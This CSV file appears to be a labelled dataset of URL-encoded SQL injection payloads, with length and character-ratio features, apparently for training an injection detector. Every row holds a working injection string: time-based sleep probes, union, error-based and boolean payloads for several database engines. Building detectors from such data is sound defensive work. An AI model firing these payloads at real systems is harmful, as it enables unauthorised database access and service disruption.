payload,payload_len,alpha,non_alpha,attack_feature,label
1%27%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29%20and%20%27iwmy%27%3D%27iwmy,61,77.04918032786885,22.950819672131146,90000.0,1
1%22%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%22jtgs%22%20like%20%22jtgs,120,84.16666666666667,15.833333333333332,120000.0,1
1%22%29%20as%20qirf%20where%206200%3D6200%20%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29--,216,81.01851851851852,18.98148148148148,60000.0,1
1%27%20where%204185%3D4185%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29--,110,81.81818181818183,18.181818181818183,30000.0,1
-6890%27%29%29%20or%205771%3D7721--,23,69.56521739130434,30.434782608695656,30000.0,1
1%27%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,65,84.61538461538461,15.384615384615385,60000.0,1
-3415%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C,207,57.971014492753625,18.84057971014493,60000.0,1
1%27%2B%28select%20%27nlvq%27%20where%207528%3D7528%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sddo%29%23,76,78.94736842105263,21.052631578947366,90000.0,1
1%22%29%20as%20wehx%20where%205744%3D5744%3Bselect%20sleep%285%29%23,44,84.0909090909091,15.909090909090908,30000.0,1
1%22%29%20as%20zovk%20where%204591%3D4591%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,68,83.82352941176471,16.176470588235293,90000.0,1
%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%281931%3D1931%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29,173,81.5028901734104,18.497109826589593,22.695035460992905,1
1%22%20where%202512%3D2512%20or%207417%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,120,87.5,12.5,90000.0,1
-1485%27%29%29%29%20union%20all%20select%207661%2C7661%2C7661%2C7661%2C7661--,53,79.24528301886792,20.754716981132077,60000.0,1
1%29%20as%20skby%20where%204269%3D4269%20or%20elt%286272%3D6272%2Csleep%285%29%29--,55,81.81818181818183,18.181818181818183,60000.0,1
-3775%27%29%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,138,83.33333333333334,16.666666666666664,30000.0,1
-7175%27%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29,221,56.10859728506787,17.647058823529413,60000.0,1
1%27%7C%7C%28select%20%27xwbo%27%20from%20dual%20where%201263%3D1263%20waitfor%20delay%20%270%3A0%3A5%27%29%7C%7C%27,70,78.57142857142857,21.428571428571427,90000.0,1
1%25%22%29%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%22%25%22%3D%22,198,71.71717171717171,28.28282828282828,60000.0,1
1%27%29%29%29%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%28%28%28%27qtni%27%3D%27qtni,131,81.67938931297711,18.3206106870229,90000.0,1
1%22%29%29%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,48,72.91666666666666,27.083333333333332,60000.0,1
-2036%27%29%20or%20%288459%3D8459%29%2A4906%20and%20%28%27hjeu%27%3D%27hjeu,45,73.33333333333333,26.666666666666668,60000.0,1
1%22%29%28select%20%28case%20when%20%284587%3D4587%29%20then%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%2876%29%7C%7Cchar%2865%29%7C%7Cchar%28102%29%7C%7Cchar%2872%29%20end%29%20from%20%28values%280%29%29%29%20and%20%28%22xhqc%22%3D%22xhqc,218,74.31192660550458,25.688073394495415,60000.0,1
1%25%27%29%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,95,84.21052631578947,15.789473684210526,30000.0,1
1%27%29%20where%209842%3D9842%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,77,85.71428571428571,14.285714285714285,90000.0,1
1%25%27%29%20rlike%20sleep%285%29%23,20,70.0,30.0,42.857142857142854,1
1%27%29%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29,43,81.3953488372093,18.6046511627907,60000.0,1
1%27%29%20where%202928%3D2928%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,136,83.82352941176471,16.176470588235293,90000.0,1
-9622%27%29%29%29%20order%20by%201%23,21,71.42857142857143,28.57142857142857,30000.0,1
1%29%20where%205651%3D5651%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,135,84.44444444444444,15.555555555555555,90000.0,1
1%27%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%20and%20%27lqsa%27%20like%20%27lqsa,64,84.375,15.625,120000.0,1
1%27%29%29%29%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%28%27iari%27%3D%27iari,85,71.76470588235294,28.235294117647058,69000.0,1
1%29%20as%20vbli%20where%205139%3D5139%20and%202782%3D2625--,42,88.09523809523809,11.904761904761903,60000.0,1
-7072%27%29%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3D4144%29%20then%201%20else%200%20end%,238,47.89915966386555,17.22689075630252,39000.0,1
1%20where%208908%3D8908%20or%207417%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,119,88.23529411764706,11.76470588235294,90000.0,1
-4397%27%29%29%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%28%28%27omqt%27%3D%27omqt,57,70.17543859649122,29.82456140350877,60000.0,1
1%20where%201299%3D1299%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,67,83.5820895522388,16.417910447761194,60000.0,1
-5097%27%29%20union%20all%20select%208992%2C8992%2C8992%2C8992%2C8992%2C8992%2C8992%2C8992%2C8992--,71,81.69014084507043,18.30985915492958,60000.0,1
1%27%29%29%20and%20%283020%3D3020%29%2A6703%20and%20%28%28%27pfal%27%3D%27pfal,44,70.45454545454545,29.545454545454547,60000.0,1
1%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29%23%20jcdh,115,75.65217391304347,24.347826086956523,30000.0,1
-8869%22%20where%203019%3D3019%20union%20all%20select%203019%2C3019%2C3019%23,55,89.0909090909091,10.909090909090908,90000.0,1
1%20or%204915%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,96,86.45833333333334,13.541666666666666,60000.0,1
1%27%20in%20boolean%20mode%29%3Bselect%20%28case%20when%20%282717%3D2634%29%20then%202717%20else%202717%2A%28select%202717%20from%20mysql.db%29%20end%29%23,103,87.37864077669903,12.62135922330097,30000.0,1
1%22%20where%202403%3D2403%20or%204915%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,113,86.72566371681415,13.274336283185843,90000.0,1
-3088%27%20or%206872%3D6872%20and%20%27miwk%27%3D%27miwk,36,80.55555555555556,19.444444444444446,60000.0,1
1%20and%20sleep%285%29%23,15,80.0,20.0,30000.0,1
-3677%27%29%29%20or%201939%3D4484,21,76.19047619047619,23.809523809523807,30000.0,1
1%27%29%29%29%3Bcall%20regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%28%27gsup%27%3D%27gsup,91,73.62637362637363,26.373626373626376,30000.0,1
1%22%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%22bnyh%22%3D%22bnyh,123,73.98373983739837,26.01626016260163,60000.0,1
-7320%22%29%20where%203907%3D3907%20union%20all%20select%203907%2C3907--,52,86.53846153846155,13.461538461538462,90000.0,1
1%29%29%29%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,46,76.08695652173914,23.91304347826087,60000.0,1
1%25%27%3Bselect%20%28case%20when%20%284660%3D4660%29%20then%204660%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,101,85.14851485148515,14.85148514851485,60000.0,1
1%22%20where%201683%3D1683%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sddo%29%23,61,80.32786885245902,19.672131147540984,90000.0,1
1%22%29%20as%20oztl%20where%206655%3D6655%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,129,87.59689922480621,12.4031007751938,90000.0,1
1%22%29%29%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%28%28%22hkjm%22%20like%20%22hkjm,200,80.5,19.5,120000.0,1
1%22%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29,44,77.27272727272727,22.727272727272727,60000.0,1
1%27%2C%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284250%3D4250%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29,225,70.22222222222221,29.777777777777775,69000.0,1
1%25%22%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,45,77.77777777777779,22.22222222222222,60000.0,1
1%27%29%29%29%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29%20and%20%28%28%28%27odsl%27%20like%20%27odsl,69,76.81159420289855,23.18840579710145,120000.0,1
1%22%20where%204366%3D4366%20and%208312%3Ddbms_pipe.receive_message%28chr%2869%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%7C%7Cchr%2868%29%2C5%29--,94,73.40425531914893,26.595744680851062,60000.0,1
-1036%27%29%20or%206872%3D6872%20and%20%28%27wvbi%27%3D%27wvbi,38,76.31578947368422,23.684210526315788,60000.0,1
1%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%23%20miji,101,88.11881188118812,11.881188118811881,60000.0,1
1%27%29%29%29%20and%205556%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%28%28%27swfj%27%20like%20%27swfj,127,80.31496062992126,19.68503937007874,120000.0,1
1%27%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%27osqf%27%3D%27osqf,109,87.1559633027523,12.844036697247708,60000.0,1
1%22%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%20and%20%22xcjt%22%3D%22xcjt,67,80.59701492537313,19.402985074626866,60000.0,1
1%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,61,83.60655737704919,16.39344262295082,60000.0,1
1%27%29%29%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%28%27mfib%27%3D%27mfib,84,71.42857142857143,28.57142857142857,39000.0,1
1%25%27%29%29%29%20order%20by%201--,19,63.1578947368421,36.84210526315789,30000.0,1
1%22%29%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%22nnmz%22%20like%20%22nnmz,122,82.78688524590164,17.21311475409836,120000.0,1
1%27%29%20order%20by%201--,16,75.0,25.0,30000.0,1
-8810%27%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%27prsn%27%20like%20%27prsn,58,79.3103448275862,20.689655172413794,90000.0,1
-5336%27%29%20where%208691%3D8691%20or%203608%3D1887--,38,81.57894736842105,18.421052631578945,60000.0,1
1%27%20where%206168%3D6168%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29srmq%29--,59,76.27118644067797,23.728813559322035,60000.0,1
1%25%27%29%29%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,46,73.91304347826086,26.08695652173913,60000.0,1
-4327%22%20or%20make_set%283107%3D1781%2C1781%29%20and%20%22lclf%22%20like%20%22lclf,56,82.14285714285714,17.857142857142858,90000.0,1
1%27%2B%28select%20yjtm%20where%203965%3D3965%20and%209389%3D3443,45,88.88888888888889,11.11111111111111,60000.0,1
1%25%27%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,56,83.92857142857143,16.071428571428573,60000.0,1
1%25%22%29%29%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%20and%20%28%28%22%25%22%3D%22,219,81.27853881278538,18.72146118721461,270000.0,1
1%29%20where%208630%3D8630%20union%20all%20select%20null%2Cnull--,47,89.36170212765957,10.638297872340425,90000.0,1
1%29%20where%205442%3D5442%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,135,84.44444444444444,15.555555555555555,90000.0,1
1%25%22%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%20and%20%22%25%22%3D%22,55,76.36363636363637,23.636363636363637,30000.0,1
1%29%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29,77,71.42857142857143,28.57142857142857,30000.0,1
1%27%20and%207533%3D7533%20and%20%27frvk%27%3D%27frvk,33,81.81818181818183,18.181818181818183,60000.0,1
-3697%27%29%29%29%20union%20all%20select%205180%2C5180%2C5180%2C5180%2C5180%2C5180%2C5180--,63,79.36507936507937,20.634920634920633,60000.0,1
1%27%7C%7C%28select%20%27homm%27%20where%204937%3D4937%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29vwyq%29%23,80,78.75,21.25,60000.0,1
1%27%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,64,75.0,25.0,39000.0,1
1%27%20in%20boolean%20mode%29%20and%20char%28109%29%7C%7Cchar%2879%29%7C%7Cchar%2870%29%7C%7Cchar%2890%29%3Dregexp_substring%28repeat%28right%28char%285012%29%2C0%29%2C5000000000%29%2Cnull%29--,127,75.59055118110236,24.409448818897637,30000.0,1
1%27%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull--,49,79.59183673469387,20.408163265306122,60000.0,1
1%22%29%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%28%22fbqy%22%20like%20%22fbqy,176,89.77272727272727,10.227272727272728,120000.0,1
-4635%22%20union%20all%20select%205087%2C5087%2C5087%2C5087%2C5087%2C5087%2C5087%2C5087%2C5087%2C5087%23,74,83.78378378378379,16.216216216216218,60000.0,1
1%22%20or%20sleep%285%29,14,78.57142857142857,21.428571428571427,30000.0,1
1%22%29%29%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%28%22jydy%22%20like%20%22jydy,87,79.3103448275862,20.689655172413794,120000.0,1
-7939%22%29%20or%203958%3D6909,20,80.0,20.0,30000.0,1
1%27%29%29%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%28%27zglq%27%3D%27zglq,165,69.6969696969697,30.303030303030305,60000.0,1
1%27%29%20where%206746%3D6746%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29--,151,84.76821192052981,15.2317880794702,30000.0,1
-7138%22%20union%20all%20select%202341%2C2341%2C2341%2C2341--,45,84.44444444444444,15.555555555555555,60000.0,1
1%22%29%3Bselect%20case%20when%201892%3D3646%20then%201%20else%20null%20end--,53,94.33962264150944,5.660377358490564,5.999999999999997,1
1%27%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%20and%20%27rupq%27%3D%27rupq,94,72.3404255319149,27.659574468085108,60000.0,1
-3582%29%20where%205873%3D5873%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%200%20end%29%20from%,226,57.52212389380531,16.371681415929203,90000.0,1
1%27%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,103,80.58252427184466,19.41747572815534,24.096385542168672,1
1%25%22%29%29%29%20and%208635%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,67,74.6268656716418,25.37313432835821,60000.0,1
1%25%27%29%29%29%20and%20sleep%285%29%23,20,60.0,40.0,30000.0,1
-1256%27%20in%20boolean%20mode%29%20union%20all%20select%207889%2C7889%2C7889%2C7889%2C7889%2C7889%2C7889%2C7889%2C7889--,87,85.0574712643678,14.942528735632186,60000.0,1
1%22%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29,158,82.27848101265823,17.72151898734177,60000.0,1
1%29%29%20and%20sleep%285%29%23,17,70.58823529411765,29.411764705882355,30000.0,1
1%22%29%20as%20jscj%20where%202308%3D2308%20or%204915%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,122,86.88524590163934,13.114754098360656,90000.0,1
1%27%29%29%20as%20fbjd%20where%208597%3D8597%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,129,75.96899224806202,24.031007751937985,30000.0,1
1%29%29%20as%20bebl%20where%202597%3D2597%20%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29--,216,81.01851851851852,18.98148148148148,60000.0,1
1%22%29%29%20or%202367%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,111,83.78378378378379,16.216216216216218,60000.0,1
%28select%20%2A%20from%20generate_series%284990%2C4990%2Ccase%20when%20%284990%3D5065%29%20then%201%20else%200%20end%29%20limit%201%29,90,87.77777777777777,12.222222222222221,30000.0,1
1%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,62,82.25806451612904,17.741935483870968,60000.0,1
1%27%29%29%20as%20nhkp%20where%208030%3D8030%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3--,120,87.5,12.5,60000.0,1
1%27%29%20where%202443%3D2443%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29--,129,75.1937984496124,24.8062015503876,60000.0,1
-3270%22%20where%202144%3D2144%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%,204,61.76470588235294,17.15686274509804,60000.0,1
-4032%27%29%20where%205157%3D5157%20or%201809%3D2810%23,37,83.78378378378379,16.216216216216218,60000.0,1
-6116%22%29%29%20union%20all%20select%203679%2C3679%2C3679%2C3679%2C3679%2C3679%2C3679--,62,80.64516129032258,19.35483870967742,60000.0,1
1%20where%203956%3D3956%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29srmq%29--,58,77.58620689655173,22.413793103448278,60000.0,1
1%25%22%20%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29%20and%20%22%25%22%3D%22,200,78.5,21.5,60000.0,1
-1148%22%29%29%20union%20all%20select%205442%2C5442%2C5442%2C5442%23,46,82.6086956521739,17.391304347826086,60000.0,1
1%22%29%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,101,81.1881188118812,18.81188118811881,60000.0,1
1%22%29%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%22liar%22%3D%22liar,115,81.73913043478261,18.26086956521739,90000.0,1
-1097%22%20where%204421%3D4421%20union%20all%20select%204421%2C4421%2C4421%2C4421%2C4421%23,65,87.6923076923077,12.307692307692308,90000.0,1
-1168%29%29%20as%20vlol%20where%203475%3D3475%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,162,85.18518518518519,14.814814814814813,60000.0,1
-4313%25%27%29%20or%206872%3D6872%20and%20%28%27%25%27%3D%27,32,65.625,34.375,60000.0,1
1%27%29%29%20as%20lkse%20where%209951%3D9951%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,145,84.13793103448276,15.862068965517242,90000.0,1
1%20where%209393%3D9393%20waitfor%20delay%20%270%3A0%3A5%27--,41,82.92682926829268,17.073170731707318,60000.0,1
1%27%2B%28select%20emeu%20where%202310%3D2310%3Bselect%20%2A%20from%20generate_series%281134%2C1134%2Ccase%20when%20%281134%3D4909%29%20then%201%20else%200%20end%29%20limit%201--,122,86.88524590163934,13.114754098360656,60000.0,1
1%25%27%20or%20sleep%285%29%23,16,68.75,31.25,30000.0,1
1%25%22%29%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,102,83.33333333333334,16.666666666666664,30000.0,1
-6453%25%27%29%29%20or%20%288459%3D8459%29%2A4906%20and%20%28%28%27%25%27%3D%27,41,60.97560975609756,39.02439024390244,60000.0,1
1%22%29%20as%20rbgl%20where%203822%3D3822%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29--,119,82.35294117647058,17.647058823529413,30000.0,1
1%27%20and%20%28select%209067%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289067%3D9067%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29,173,82.65895953757226,17.341040462427745,60000.0,1
